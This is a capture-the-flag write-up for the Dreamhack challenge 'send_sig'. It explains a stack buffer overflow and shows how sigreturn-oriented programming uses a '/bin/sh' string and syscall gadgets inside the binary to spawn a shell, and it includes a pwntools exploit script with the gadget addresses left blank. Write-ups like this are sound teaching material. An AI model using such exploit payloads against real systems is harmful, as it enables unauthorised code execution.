---
title: "[Dreamhack] send_sig - SROP with /bin/sh in Binary"
date: 2024-01-18 00:00:00 +0700
categories: [Dreamhack, Binary Exploitation]
tags: [pwn, srop, sigreturn, rop, syscall, dreamhack]
author: datious
description: "Dreamhack writeup: send_sig — SROP exploitation dùng /bin/sh có sẵn trong binary và pop_rax;syscall gadget."
---

# [Write up for Dreamhack] Challenge: send_sig
**Author: datious**

## Vulnerability

```c
void vuln(void)
{
  undefined1 local_10 [8];
  
  write(1, "Signal:", 7);
  read(0, local_10, 0x400);   // ← 1024 bytes into 8-byte buffer!
  return;
}
```

→ **Buffer Overflow** — overwrite RIP to control execution flow.

## Security Layers

![Checksec](https://hackmd.io/_uploads/S1A5LCHBMl.png)

- **NX is on** → shellcode injection doesn't work
- **Not enough ROP gadgets** for standard ret2libc

## Key Discovery

During reconnaissance, found critical assets inside the binary:

- **`syscall`** gadget
- **`pop rax`** gadget
- **`"/bin/sh"`** string within the binary itself!

![Gadgets](https://hackmd.io/_uploads/Bknqt0rrze.png)

![/bin/sh](https://hackmd.io/_uploads/r15GcASBfl.png)

→ Perfect ingredients for **SROP**!

## Strategy — SROP

**SROP (Sigreturn-Oriented Programming):**
- Set `RAX = 15` (`rt_sigreturn` syscall number)
- Craft a **fake sigreturn frame** on the stack
- Call `syscall` → kernel restores all registers from our frame
- Result: arbitrary register control → `execve("/bin/sh", 0, 0)`

### Steps

```
1. Overflow buffer (8 bytes) + saved rbp (8 bytes) = 16 bytes padding
2. Return to: pop_rax gadget → set RAX = 15
3. Call syscall → rt_sigreturn
4. Kernel reads fake frame from stack → sets:
   - RAX = 59 (execve)
   - RDI = addr of "/bin/sh"
   - RSI = 0
   - RDX = 0
   - RIP = syscall
5. syscall again → execve("/bin/sh", 0, 0) → shell!
```

## Exploit Script

```python
from pwn import *

elf = ELF('./send_sig')
p   = process('./send_sig')
# or: p = remote(...)

context.arch = 'amd64'
context.os   = 'linux'

# Find gadgets
pop_rax_syscall = ...   # 0x... : pop rax ; syscall
syscall_ret     = ...   # 0x... : syscall ; ret
binsh_addr      = ...   # 0x... : address of "/bin/sh" in binary

# Craft sigreturn frame
frame         = SigreturnFrame()
frame.rax     = 59              # execve
frame.rdi     = binsh_addr      # ptr to "/bin/sh"
frame.rsi     = 0
frame.rdx     = 0
frame.rip     = syscall_ret     # call execve syscall
frame.rsp     = ...             # writable stack

# Payload
payload  = b'A' * 16            # overflow (8 buf + 8 rbp)
payload += p64(pop_rax_syscall)
payload += p64(15)              # RAX = 15 → rt_sigreturn
payload += p64(syscall_ret)     # trigger sigreturn
payload += bytes(frame)

p.sendafter("Signal:", payload)
p.interactive()
```

> **Why SROP over ret2libc here?** No libc leak available, but we have `"/bin/sh"` in the binary + `syscall` gadget. SROP only needs syscall #15 — no leak required!
